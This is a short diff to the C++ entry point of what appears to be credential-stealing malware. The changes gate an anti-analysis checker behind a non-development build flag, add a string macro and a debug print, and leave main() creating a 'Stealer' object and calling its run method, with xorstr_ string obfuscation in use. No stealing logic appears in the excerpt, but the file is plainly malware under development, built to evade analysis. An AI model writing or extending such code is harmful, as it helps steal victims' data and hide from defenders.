@@ -2,8 +2,12 @@
 #include <locale>
 #include "windows.h"
 #include "utils/Utils.h"
-#include "Config.h"
+
+#if !DEV
 #include "antianalysis/AntiAnalysisChecker.h"
+#endif
+
+#define prepare(str) (std::string(str) + "1")
 
 void globalExceptionHandler() {
     try {
@@ -35,6 +39,9 @@ int main() {
 
     std::locale::global(std::locale(""));
     setlocale(LC_ALL, xorstr_("ru-RU"));
+
+    std::string str = prepare("Some string");
+    std::cout << str << std::endl;
 
     Stealer stealer;
     stealer.run();
